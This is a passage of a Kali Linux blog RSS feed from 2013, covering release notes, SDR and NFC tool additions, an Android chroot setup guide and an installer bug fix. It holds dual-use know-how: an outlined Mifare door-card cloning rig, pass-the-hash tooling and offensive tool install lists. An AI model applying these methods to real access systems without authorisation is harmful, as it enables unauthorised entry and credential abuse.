CPU architecture: 7 CPU variant : 0x2 CPU part : 0xc09 CPU revision : 10 Hardware : Compulab CM-FX6 Revision : 63012 Serial : 0b0991d4d81917c9 root@kali:~# cat /proc/meminfo MemTotal: 2006440 kB MemFree: 1922864 kB .... </code></pre></description>
</item>
<item>
<title>Kali Linux 1.0.5 and Software Defined Radio</title>
<link>https://www.kali.org/blog/kali-linux-1-0-5-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-5-release/</guid>
<pubDate>Thu, 05 Sep 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-5-release/images/kali-1.0.5-release.jpg" type="image/jpg"/>
<description><p>Today we are pleased to announce the immediate availability of <a href="https://www.kali.org/get-kali/">Kali Linux 1.0.5</a> with a rollup of various <a href="https://bugs.kali.org/changelog_page.php?version_id=2">tool additions, fixes, and upgrades</a>, including our fix for the encrypted <a href="https://www.kali.org/blog/tracking-fixing-installer-bugs/">encrypted LVM installation issue</a> that we documented last week. As usual, users with Kali already installed just need to run a simple update to get the latest goodness:</p> <pre><code class="language-console">root@kali:~# apt-get update root@kali:~# apt-get dist-upgrade </code></pre> <p>We&rsquo;ve also received updated ARM images from OffSec, which bring several fixes to issues found in the 1.0.4 releases. Kali Linux has specific ARM images for 9 separate hardware devices/families, including the Raspberry Pi, Galaxy Note 10.1, BeagleBone Black, Odroid U2, Odroid XU (!) and more. While Kali Linux works on all the hardware above natively, don&rsquo;t forget you can get Kali Linux installed on almost any Android phone or tablet.</p> <p>Software Defined Radio (SDR) researchers will be especially pleased to know that we have made some significant tool additions in this growing field. With some great input and suggestions from @NowSec, we placed a great deal of focus in the past few weeks on adding numerous SDR tools and drivers to our arsenal:</p> <ul> <li>kalibrate-rtl</li> <li>gr-air-modes</li> <li>RTLSDR Scanner</li> <li>gr-scan</li> <li>rtl-sdr</li> <li>Gqrx</li> <li>GR Extras</li> <li>gr-baz</li> <li>gr-osmosdr</li> <li>gr-iqbal</li> <li>gr-fcdproplus</li> <li>UHD support</li> <li>HackRF support</li> <li>RTL2832U support</li> <li>Funcube Dongle Pro+ support</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-5-release/images/SDR_menu.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-5-release/images/SDR_menu.png" alt="" /> </a> </p> </p> <p>We also forked <a href="https://www.gnuradio.org/redmine/projects/gnuradio/wiki">GNU Radio</a> from the Debian repositories and upgraded it to version 3.6.5.1, a task that sounds much simpler than it really is since its dependencies have dependencies.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-5-release/images/gnuradio-depends.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-5-release/images/gnuradio-depends.png" alt="" /> </a> </p> </p> <p>We&rsquo;re very pleased with the end result and these additions have given us the excuse to play around in the field of SDR, which is filled with great potential for research. This isn&rsquo;t the end of our support for SDR, but only the beginning as we intend to combine our rock-solid stability with cutting edge device support to become the <a href="http://needsec.com/kali-linux-improves-software-defined-radio-sdr-support/">best platform for SDR research</a> in the industry.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-5-release/images/gqrx-kali.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-5-release/images/gqrx-kali.png" alt="" /> </a> </p> </p> <h2 id="but-wait-theres-more">But Wait, There&rsquo;s More!</h2> <p>This release of Kali Linux isn&rsquo;t only about SDR, though. For our users who love hacking NFC, we have also beefed up our suite of tools for manipulating MIFARE cards with updates to libnfc, mfoc, and mfcuk along with the addition of mfterm.</p> <p>We hope you enjoy this release as much as we enjoyed making it. For a complete list of what&rsquo;s new in Kali Linux, be sure to check out the full <a href="https://bugs.kali.org/changelog_page.php">changelog</a> and if you have new tool suggestions or ideas on how we can make Kali even better, please submit them to the <a href="https://bugs.kali.org/">Kali Linux Bug Tracker</a>.</p></description>
</item>
<item>
<title>Kali Linux on Android using Linux Deploy</title>
<link>https://www.kali.org/blog/kali-linux-android-linux-deploy/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-android-linux-deploy/</guid>
<pubDate>Tue, 03 Sep 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-android-linux-deploy/images/kali-android-deploy.jpg" type="image/jpg"/>
<description><h3 id="kali-linux-on-any-android-phone-or-tablet">Kali Linux on any Android Phone or Tablet</h3> <p><p> <a href='https://www.kali.org/blog/kali-linux-android-linux-deploy/images/linux-deploy-kali-list-00.png'> <img src="https://www.kali.org/blog/kali-linux-android-linux-deploy/images/linux-deploy-kali-list-00.png" alt="" /> </a> </p> </p> <p>Getting Kali Linux to run on ARM hardware has been a major goal for us since day one. So far, we&rsquo;ve built <strong>native</strong> images for the Samsung Chromebook, Odroid U2, Raspberry Pi, RK3306, Galaxy Note 10.1, CuBox, Efika MX, and BeagleBone Black to name a few. This however does not mean you cannot install Kali Linux in a chroot on almost any modern device that runs Android. In fact, the developers of <a href="https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy&amp;hl=en">Linux Deploy</a> have made it extremely easy to get any number of Linux distributions installed in a chroot environment using a simple GUI builder.</p> <h5 id="prerequisites">Prerequisites</h5> <ul> <li>A device running Android 2.1 and above, rooted.</li> <li>At least 5 GB free space on internal or external storage.</li> <li>A fast, wireless internet connection.</li> <li>Patience to wait for a distribution to bootstrap from the network.</li> </ul> <h5 id="configuring-linux-deploy-for-kali">Configuring Linux Deploy for Kali</h5> <p>There&rsquo;s actually very little to be done to get Kali installed. By choosing <strong>Kali Linux</strong> in the &ldquo;<strong>Distribution</strong>&rdquo; tab, you&rsquo;ve pretty much covered the important stuff. Optionally, you can choose your architecture, verify that the Kali mirror is correct, set your installation type and location on your Android device, etc. Generally speaking, the defaults provided by Linux Deploy are good to begin with.</p> <h5 id="building-the-kali-image">Building the Kali Image</h5> <p><p> <a href='https://www.kali.org/blog/kali-linux-android-linux-deploy/images/install-kali-linux-deploy.png'> <img src="https://www.kali.org/blog/kali-linux-android-linux-deploy/images/install-kali-linux-deploy.png" alt="" /> </a> </p> </p> <p>Once you are happy with all the settings, hitting the &ldquo;install&rdquo; button will start a Kali Linux bootstrap directly from our repositories. Depending on your Internet connection speed, this process could take a while. You&rsquo;ll be downloading a base install of Kali Linux (with no tools) at minimum.</p> <h5 id="starting-up-your-chrooted-kali">Starting up your chrooted Kali</h5> <p>Once the installation is complete, you can have Linux Deploy automatically mount and load up your Kali Linux chroot image. This also includes the starting of services such as SSH and VNC for easier remote access. All of this is automagically done by hitting the &ldquo;<strong>start</strong>&rdquo; button. You should see Linux Deploy setting up your image with output similar to the following:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-android-linux-deploy/images/linux-deploy-mount.png'> <img src="https://www.kali.org/blog/kali-linux-android-linux-deploy/images/linux-deploy-mount.png" alt="" /> </a> </p> </p> <p>At this stage, Linux Deploy has started a VNC and SSH server inside your chrooted Kali image. You can connect to the Kali session remotely using the IP address assigned to your Android device (in my case, 10.0.0.10).</p> <h5 id="logging-in-to-your-chrooted-kali">Logging in to your chrooted Kali</h5> <p>Now you can use either a SSH or VNC client to access your Kali instance. The VNC password is &ldquo;<strong>changeme</strong>&rdquo; and the SSH credentials are &ldquo;<strong>android</strong>&rdquo; for the username (configured via Linux Deploy) and &ldquo;<strong>changeme</strong>&rdquo; as the password:</p> <pre><code class="language-console">muts@slim:~$ ssh android@10.0.0.10 android@10.0.0.10 password: Linux localhost 3.4.5-447845 #1 SMP PREEMPT Fri Apr 12 17:22:34 KST 2013 armv7l Kali GNU/Linux 1.0 [running on Android via Linux Deploy] android@localhost:~$ sudo su root@localhost:/home/android# df Filesystem 1K-blocks Used Available Use% Mounted on /dev/loop3 4180944 667268 3304012 17% / tmpfs 952708 80 952628 1% /dev tmpfs 952708 0 952708 0% /dev/shm root@localhost:/home/android# root@localhost:/home/android# apt-get update Hit http://http.kali.org kali Release.gpg Hit http://http.kali.org kali Release Hit http://http.kali.org kali/main Sources Hit http://http.kali.org kali/contrib Sources Hit http://http.kali.org kali/non-free Sources Hit http://http.kali.org kali/main armel Packages Hit http://http.kali.org kali/contrib armel Packages Hit http://http.kali.org kali/non-free armel Packages Ign http://http.kali.org kali/contrib Translation-en_US Ign http://http.kali.org kali/contrib Translation-en Ign http://http.kali.org kali/main Translation-en_US Ign http://http.kali.org kali/main Translation-en Ign http://http.kali.org kali/non-free Translation-en_US Ign http://http.kali.org kali/non-free Translation-en Reading package lists... Done root@localhost:/home/android# </code></pre> <h5 id="image-size-considerations">Image Size Considerations</h5> <p>If left unchanged, Linux Deploy will automatically set an image size of around 4 GB, for a &ldquo;naked&rdquo; installation of Kali. If you would like to install additional Kali tools down the road, you might want to consider using a larger image size, which is configurable via the settings in Linux Deploy.</p> <h5 id="local-vnc-connections">Local VNC Connections</h5> <p>We had to try a couple of VNC clients to get one to work properly. Although controlling Kali through a local VNC client isn&rsquo;t the most convenient of tasks, it certainly is possible. However, we suspect that most people will be SSH&rsquo;ing into this instance. The picture below was overlayed with a Kali Linux desktop screenshot taken from a Galaxy S4.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-android-linux-deploy/images/galaxy-s4-kali-linux.png'> <img src="https://www.kali.org/blog/kali-linux-android-linux-deploy/images/galaxy-s4-kali-linux.png" alt="" /> </a> </p> </p> <p>Anyone fancy a simple smartphone <a href="https://www.offsec.com/kali-linux/kali-linux-iso-of-doom/">hardware backdoor</a>?</p></description>
</item>
<item>
<title>Tracking and Fixing an Installer Bug</title>
<link>https://www.kali.org/blog/tracking-fixing-installer-bugs/</link>
<guid isPermaLink="true">https://www.kali.org/blog/tracking-fixing-installer-bugs/</guid>
<pubDate>Thu, 29 Aug 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/tracking-fixing-installer-bugs/images/kali-installer-bug.jpg" type="image/jpg"/>
<description><p>A little while back, a bug with the LVM encrypted install in Kali Linux 1.0.4 was <a href="https://bugs.kali.org/view.php?id=443">reported</a> in our <a href="https://www.kali.org/docs/community/submitting-issues-kali-bug-tracker/">bug tracker</a>. This bug was high priority in our TODO as encrypted installs are an important feature in our industry so we wanted to squash this bug ASAP. This article will describe the process of debugging, identifying, and fixing this bug in Kali, and ultimately in Debian as well.</p> <p>The bug itself was weird; installing Kali with the &ldquo;LVM Encrypted&rdquo; option would result in a failed boot once the installation was done:</p> <p><p> <a href='https://www.kali.org/blog/tracking-fixing-installer-bugs/images/kali-lvm-boot-bug.png'> <img src="https://www.kali.org/blog/tracking-fixing-installer-bugs/images/kali-lvm-boot-bug.png" alt="" /> </a> </p> </p> <p>The work-around suggested in the bug report indicated that the <strong>/etc/crypttab</strong> file was empty. By manually remounting the encrypted partition, repopulating it with the required parameters, and then updating the initramfs, the machine would boot successfully into the encrypted partition again. Most definately annoying and far from practical.</p> <p>Now with the problem well defined, the solution seemed simple. Something was probably wrong with the way <strong>/etc/crypttab</strong> gets updated during the installation process. Our next step was to investigate the scripts that are responsible for this update and see if there are any bugs in the file update process. But how would you locate the exact script responsible for this update and how could we figure out what package it lives in?</p> <p>To our rescue comes <a href="https://wiki.debian.org/DebianInstaller/CheckOut">DebianInstaller</a>. Using this set of scripts, we checked out the whole DebianInstaller source tree. This would allow us to search for the scripts that affect <strong>/etc/crypttab</strong> with much greater ease:</p> <pre><code class="language-console">root@kalima:~# svn co svn://anonscm.debian.org/svn/d-i/trunk debian-installer root@kalima:~# cd debian-installer root@kalima:~/debian-installer# scripts/git-setup root@kalima:~/debian-installer# mr -p checkout </code></pre> <p>Once all the repositories had been checked out, we could simply grep for any files that reference the <strong>/etc/crypttab</strong> file as follows:</p> <pre><code class="language-console">root@kalima:~/debian-installer# grep -r '/etc/crypttab' * |grep -v ^manual ... packages/partman-crypto/finish.d/crypto_config:# dm-crypt: creates /etc/crypttab entries packages/partman-crypto/finish.d/crypto_config: echo &quot;$target $source $keyfile $opts&quot; &gt;&gt; /target/etc/crypttab ... root@kalima:~/debian-installer# </code></pre> <p>We see above that it&rsquo;s the &ldquo;<strong>crypto_config</strong>&rdquo; script that writes to <strong>/etc/crypttab</strong>, which is located in the <strong>partman-crypto</strong> package.</p> <p>Ideally, we would like to debug this script and see where the problem is, but how would you do this in a live installation media? The answer is relatively simple - we just had to pop open a command prompt during the installation process. The trick is to invoke our debugging shell (by pressing CTRL+ALT+F2) during the right stage of the installation - in our case we needed to interrupt the installer before the <strong>crypto_config</strong> script was run but after the <strong>partman-crypto</strong> udeb was installed, so the beginning of the partitioning process would be a good spot. We proceeded to edit the <strong>/lib/partman/finish.d/55_crypto_config</strong> and added &ldquo;<strong>set -x</strong>&rdquo; at the start of the script:</p> <p><p> <a href='https://www.kali.org/blog/tracking-fixing-installer-bugs/images/partman-script-debug.png'> <img src="https://www.kali.org/blog/tracking-fixing-installer-bugs/images/partman-script-debug.png" alt="" /> </a> </p> </p> <p>We then let the installer do its thing and just before the installation completed, we took a peek at <strong>/var/log/syslog</strong> in another shell. To our surprise, we saw that the <strong>/etc/crypttab</strong> file *was* being updated, contrary to our initial beliefs, as can be seen in the syslog of the installation. <strong>WTH</strong>:</p> <pre><code class="language-plain">Aug 28 21:57:42 main-menu[954]: (process:9810): crypttab_add_entry Aug 28 21:57:42 main-menu[954]: (process:9810): /dev/sda5 Aug 28 21:57:42 main-menu[954]: (process:9810): /var/lib/partman/devices/=dev=sda/256901120-160041009151 Aug 28 21:57:42 main-menu[954]: (process:9810): /dev/mapper/sda5_crypt ... Aug 28 21:57:42 main-menu[954]: (process:9810): echo Aug 28 21:57:42 main-menu[954]: (process:9810): sda5_crypt UUID=6250dbca-648b-4848-9132-cfa900ab5874 none luks </code></pre> <p>This is where we started scratching our heads. If the problem was not in the writing of this file (as we expected), then why was there an empty <strong>/etc/crypttab</strong> file after the installation? Perhaps the problem was not in <strong>partman-crypto</strong> after all, but in how <strong>live-build</strong> generates our ISOs? We tested this theory of ours by using a Kali mini installation ISO (not built via live-build) and noticed that the LVM encrypted installs were working fine when using that installation media.</p> <p>We know that the live-installer uses <em>tar</em> to copy the whole live filesystem into a mounted <strong>/target</strong> directory and it assumes that the filesystems are empty, which is mostly true since they were just created by partman. This means that any pre-existing file can be overwritten if they are also in the live image, which was happening to <strong>/etc/crypttab</strong> in this case.</p> <p>Further examination revealed that the problem was in <strong>live-installer</strong>, whereby it overwrites the generated <strong>/etc/crypttab</strong>. The live-installer already has some provisions to not overwrite <strong>/etc/fstab</strong>, so it&rsquo;s just a matter of generalizing that rule and including the <strong>/etc/crypttab</strong> file as well:</p> <pre><code class="language-console">$ diff --git a/debian/live-installer.postinst b/debian/live-installer.postinst index 9a39d8d..bc40b84 100644 (file) --- a/debian/live-installer.postinst +++ b/debian/live-installer.postinst @@ -8,6 +8,8 @@ db_capb backup # Architecture and OS detection ARCH=`udpkg --print-architecture` OS=`udpkg --print-os` +# Files that must not be overwritten by copy of live system +FILES_TO_PRESERVE=&quot;/etc/fstab /etc/crypttab&quot; NEWLINE=&quot; &quot; @@ -34,11 +36,12 @@ install_live_system () { # symlinks there. rmdir /target/var/lock /target/var/run 2&gt;/dev/null || true - # Backup pre-existing /etc/fstab as it will be overwritten by the - # copy of the live system - if [ -e /target/etc/fstab ] &amp;&amp; [ ! -e /target/etc/fstab.live-installer ]; then - mv /target/etc/fstab /target/etc/fstab.live-installer - fi + # Backup files that should not be overwritten by the copy + for f in $FILES_TO_PRESERVE; do + if [ -e /target$f ] &amp;&amp; [ ! -e /target/${f}.live-installer ]; then + mv /target$f /target${f}.live-installer + fi + done for place in $PLACES; do [ ! -e $place ] &amp;&amp; continue @@ -83,10 +86,12 @@ install_live_system () { eval ${SUPPORT}_teardown done - # Restore the fstab file created by d-i - if [ -e /target/etc/fstab.live-installer ]; then - mv /target/etc/fstab.live-installer /target/etc/fstab - fi + # Restore important configuration files + for f in $FILES_TO_PRESERVE; do + if [ -e /target${f}.live-installer ]; then + mv /target${f}.live-installer /target$f + fi + done if [ ${PLACE_FOUND} -eq 0 ]; then error &quot;Could not find any live images&quot; </code></pre> <p>The above patch fixed the issue for us, allowing encrypted LVM installs to complete and boot successfully. As with any Debian bugs we encounter, we <a href="https://salsa.debian.org/installer-team/live-installer/-/commit/17678631e40f9fe31791bf90394fa81d87cce615">send patches back to Debian</a> to improve the distribution we build upon. A fix for this installer bug will come out in our next point release (<a href="https://bugs.kali.org/changelog_page.php">1.0.5</a>) next week. People generating their own ISO images though <strong>live-build</strong> will automatically receive the fixed package.</p> <p><p> <a href='https://www.kali.org/blog/tracking-fixing-installer-bugs/images/installer-bug-fixed.png'> <img src="https://www.kali.org/blog/tracking-fixing-installer-bugs/images/installer-bug-fixed.png" alt="" /> </a> </p> </p></description>
</item>
<item>
<title>Kali Linux - Penetration Testing Platform</title>
<link>https://www.kali.org/blog/kali-linux-penetration-testing-platform/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-penetration-testing-platform/</guid>
<pubDate>Wed, 31 Jul 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/kali-pentesting-platform.jpg" type="image/jpg"/>
<description><p>Whenever we are given the opportunity to describe Kali Linux, we use the word &ldquo;<strong>powerful</strong>&rdquo;. Have you ever wondered or asked yourself why exactly we consider Kali to be so &ldquo;Powerful&rdquo;? Why is Kali any different or better from say, an Ubuntu machine with a bunch of security tools preinstalled on it? After all, <strong>our nmap package isn&rsquo;t any better than anyone else&rsquo;s, is it</strong>?</p> <h3 id="flexible-penetration-testing-platform">Flexible Penetration Testing Platform</h3> <p>One of the major benefits of Kali Linux is that <strong>it&rsquo;s not merely a bunch of tools</strong> pre-packaged into a Linux distribution. <strong>Kali is a real &ldquo;Penetration Testing Platform&rdquo;</strong> - and that&rsquo;s not just a cool buzzword we use. Derived from the rock solid Debian platform, Kali is flexible enough to provide features such as:</p> <ul> <li><strong><strong>Rolling distribution with seamless updates and upgrades.</strong></strong></li> <li><strong><strong>Automated installations using preseed files including network and PXE installs.</strong></strong></li> <li><strong><strong>Ability to easily create custom Kali images using live-build, with multiple WM support.</strong></strong></li> <li><strong><strong>Whole disk encryption during installation.</strong></strong></li> <li><strong><strong>Multiple ARM images for a wide variety of hardware</strong></strong></li> <li><strong><strong>Accessibility support for blind and visually impaired users.</strong></strong></li> <li><strong><strong>Bleeding edge repositories.</strong></strong></li> </ul> <p>Each one of these features provides multiple interesting opportunities for penetration testers, security auditors, and forensics folks alike. We would like to present a few simple scenarios which we had the opportunity to implement, demonstrating just how powerful Kali Linux can be.</p> <h3 id="scenario-1---simple-deployment-of-kali-scanning-agents">Scenario 1 - Simple Deployment of Kali Scanning Agents</h3> <p>Consider the following scenario - you are a security administrator of a multi-national corporation. You are asked to run a vulnerability scan on each of your twelve offices, located in different parts of the world. Naturally, you have an insignificant budget to complete this task and the VA results need to be submitted to management ASAP. How would you go about accomplishing this task? This would be the &ldquo;Kali&rdquo; way:</p> <ul> <li> <p>Deploy a minimal installation of Kali &ldquo;agents&rdquo; using a PXE setup and a preseed file to all locations. The agent should include an OpenSSH server, Metasploit, and OpenVAS. If this is not possible in some of your offices, you can easily create a custom Kali ISO using a live build recipe and have Kali installed in those locations manually. Either way, Kali should be configured to automatically start the SSH, metasploit, msfrpcd, and openvas services at boot time.</p> </li> <li> <p>Once all our Kali agents are up and running, we connect to the msfrpcd service on each of them and use the metasploit to openvas bridge to kick off a local vulnerability scan in each geographic location. Once the scans are complete, we can either download the scan reports from each location, or choose to verify the exploitability of the discovered vulnerabilities by importing our scans into Metasploit and logging any successful sessions which are created.</p> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/multiple-scans.png'> <img src="https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/multiple-scans.png" alt="" /> </a> </p> </p> <h3 id="scenario-2---battery-powered-portable-mifare-rfid-card-cloner">Scenario 2 - Battery Powered Portable Mifare RFID Card Cloner</h3> <p>Suppose for a moment that you are a security auditor tasked to test a standard Mifare-based door system. You want to be able to dump the contents of a valid RFID card in the system in order to clone it later on. You have only a few minutes to preform the cloning task once you&rsquo;ve been handed the valid card.</p> <ul> <li> <p>Install Kali Linux on an SS808 arm device, powered by a lithium battery and loop an NFC tool such as <strong>mfoc</strong> to dump any card presented to it, saving the dumps on a local SD card.</p> </li> <li> <p>Once dumped, use the Mifare card data to create a clone of the original card - task completed!</p> </li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/nfc-rig-kali1.png'> <img src="https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/nfc-rig-kali1.png" alt="" /> </a> </p> </p> <h3 id="scenario-3---portable-penetration-testing-toolkit">Scenario 3 - Portable Penetration Testing Toolkit</h3> <p>Alright, now we&rsquo;re just showing off, we know! But this screenshot was too cool to just ignore, so we had to post it.</p> <ul> <li>Consider running your favorite web based security tool, such as OpenVAS, or <strong>Metasploit Pro</strong> directly from your tablet. With 4 or 8 cores, working on small ARM devices is no longer the slow and painful process it once was.</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/msfpro2.png'> <img src="https://www.kali.org/blog/kali-linux-penetration-testing-platform/images/msfpro2.png" alt="" /> </a> </p> </p> <h3 id="kali-linux---a-flexible-powerful-penetration-testing-platform">Kali Linux - A flexible, Powerful Penetration Testing Platform</h3> <p>Hopefully, these brief scenarios will spark your imagination and encourage you to explore all that Kali Linux has to offer and make you realize that the distribution is more than just a bunch of tools cobbled together haphazardly. We are very proud of our distribution and are committed to making it the best it can possibly be thanks to the help and suggestions of the security community.</p></description>
</item>
<item>
<title>Kali Linux 1.0.4 Summer Update Release</title>
<link>https://www.kali.org/blog/kali-linux-1-0-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-4-release/</guid>
<pubDate>Thu, 25 Jul 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-4-release/images/kali-1.0.4-release.jpg" type="image/jpg"/>
<description><p>In keeping with our tradition of publishing new releases during the annual <a href="https://www.blackhat.com/">Black Hat</a> and <a href="https://www.defcon.org/">DEF CON</a> conferences, we are pleased to announce the availability of <a href="https://www.kali.org/get-kali/">Kali Linux 1.0.4</a>. The last few months since the initial release of Kali have seen a large number of changes, upgrades, and improvements in the distribution, all of which are included in version 1.0.4.</p> <h3 id="penetration-testing-tool-additions">Penetration Testing Tool Additions</h3> <p>Thanks to numerous requests from the Kali Linux community on the Kali Bug Tracker, we have added many new tools to Kali&rsquo;s arsenal, including:</p> <h3 id="penetration-testing-tool-updates">Penetration Testing Tool Updates</h3> <p>In addition to the new tools that we have added to the distribution, version 1.04 of Kali Linux also contains many upgraded packages. Some of the more notable updates are:</p> <ul> <li> <p>Winexe</p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=302">Pass the Hash Toolkit</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=322">enum4linux</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=246">RegRipper</a></p> </li> <li> <p>rfcat</p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=388">Unicornscan</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=120">jSQL</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=171">JD-GUI</a></p> </li> <li> <p>Ubertooth</p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=150">Ghost Phisher</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=154">Uniscan</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=121">Arachni</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=110">Bully</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=290">OpenVAS</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=82">Volatility</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=363">Durandal&rsquo;s Backdoor</a></p> </li> <li> <p><a href="https://paterva.com/web6/products/maltego.php">Maltego</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=325">OWASP ZAP</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=255">Armitage</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=169">DNSrecon</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=306">Vega</a></p> </li> <li> <p><a href="https://bugs.kali.org/view.php?id=235">WPScan</a></p> </li> </ul> <h3 id="more-kali-linux-arm-images">More Kali Linux ARM Images</h3> <p>Our quest to get Kali Linux running on popular ARM hardware is going strong and our trusted contributor, <a href="https://www.offsec.com/">OffSec</a> , has provided new ARM images for the <strong>BeagleBone Black</strong>, <strong>CuBox</strong>, and <strong>Efika MX</strong> to our <a href="https://www.kali.org/get-kali/">growing collection</a>.</p> <h3 id="seamless-upgrade-of-kali-linux">Seamless upgrade Of Kali Linux</h3> <p>As usual, you do not need to re-download Kali Linux 1.0.4 if you already have it installed. A regular &ldquo;apt-get update &amp;&amp; apt-get dist-upgrade&rdquo; will do the job of getting you to the latest and greatest!</p></description>
</item>
<item>
<title>Pass the Hash toolkit, Winexe and more.</title>
<link>https://www.kali.org/blog/pass-the-hash-toolkit-winexe-updates/</link>
<guid isPermaLink="true">https://www.kali.org/blog/pass-the-hash-toolkit-winexe-updates/</guid>
<pubDate>Mon, 15 Jul 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/pass-the-hash-toolkit-winexe-updates/images/kali-pass-hash-toolkit.jpg" type="image/jpg"/>
<description><p>We&rsquo;ve just pushed a bunch of packages, tools, and utilities to the main Kali repositories. These tools have been on the top of our wish list for a while and some of them were quite challenging to package. Before we start telling you of our packaging woes, here&rsquo;s how to update your Kali installation and get the latest goodness from our repos:</p> <pre><code class="language-sh">apt-get update apt-get dist-upgrade apt-get install passing-the-hash unicornscan winexe apt-get install unicornscan enum4linux polenum apt-get install nfspy firmware-mod-kit wmis # and if you haven't already: apt-get install nipper-ng jsql oclgausscrack ghost-phisher uniscan apt-get install lbd automater arachni bully inguma sslsplit dumpzilla apt-get install owasp-mantra-ff recon-ng ridenum regripper jd-gui </code></pre> <h3 id="pass-the-hash-toolkit">Pass The Hash Toolkit</h3> <p>We have *finally* finished packaging the <a href="https://code.google.com/archive/p/passing-the-hash/downloads">Pass the Hash Toolkit</a> in an elegant and intelligent way, thanks to samba4. Samba 4 is architectured differently than previous versions and many parts of the core functionality have been moved into libraries. This made it possible for us to easily override a couple of functions in those libraries with the help of the dynamic loader (using LD_PRELOAD) and saved us the need to recompile a patched samba in order to introduce the PTH tookit to Kali. All PTH tools and utilities have a &ldquo;<strong>pth-</strong>&rdquo; prefix.</p> <h3 id="winexe">Winexe</h3> <p>Winexe (also with PTH capabilities) was also challenging to get running in Kali due to <a href="https://sourceforge.net/p/winexe/bugs/21/">mysterious segfaults</a> in the application on 32 bit Kali systems. Fortunately, those issues were solved and the latest Winexe is now available in the Kali repositories.</p> <h3 id="kali-linux-release-at-def-con-21">Kali Linux Release at DEF CON 21</h3> <p>We will be releasing a bugfix rollup of Kali Linux during the BlackHat and DEF CON security conferences this year - all these tool additions and updates will be available in the upcoming release. To all conference goers, see you there!</p></description>
</item>
<item>
<title>Kali Linux Accessibility Improvements</title>
<link>https://www.kali.org/blog/kali-linux-1-0-3-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-1-0-3-release/</guid>
<pubDate>Fri, 26 Apr 2013 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-1-0-3-release/images/kali-speech-support.jpg" type="image/jpg"/>
<description><p>A couple of weeks ago, we were approached (independently) by two blind security enthusiasts who both drew our attention to the fact that Kali Linux had no built-in accessibility features. This made Kali difficult, if not impossible, to both install and use from a blind or visually impaired user&rsquo;s perspective.</p> <p>Our first attempts at building an accessible version of Kali failed and after a bit of digging, we found that there were several upstream <a href="https://packages.debian.org/wheezy/gdm3">GNOME Display Manager</a> (GDM3) bugs in <a href="https://www.debian.org/">Debian</a>, which prevented these accessibility features from functioning with the GDM greeter. Working together with an upstream GNOME developer, we knocked out these bugs and had the fixes implemeted in Kali, and hopefully in future builds of GDM3 in Debian. To make the <a href="https://www.kali.org/docs/installation/">Kali installation</a> accessible as well, we have added a new &ldquo;accessibility&rdquo; boot option that triggers the speech engine during the installation process.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-1-0-3-release/images/desktop-installer-small.png'> <img src="https://www.kali.org/blog/kali-linux-1-0-3-release/images/desktop-installer-small.png" alt="" /> </a> </p> </p> <p>We are very proud to have sponsored this work, which has brought much-improved accessibility features to both Kali Linux and Debian and we sincerely hope to continue receiving <a href="https://bugs.kali.org/">feedback</a> from the community so we can further improve Kali Linux. We have also taken this opportunity add a new &ldquo;Live Desktop&rdquo; installer and have released a <a href="https://www.kali.org/get-kali/">new version of Kali Linux</a> that has these accessibility features built-in.</p> <p><strong>To activate the speech assisted installer, press &ldquo;S&rdquo; at boot time, and hit enter.</strong></p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe src="https://www.kali.org/blog/kali-linux-1-0-3-release/https://player.vimeo.com/video/64376041?dnt=1" style="position: absolute; top: 0; left: 0; width: 100%; height: 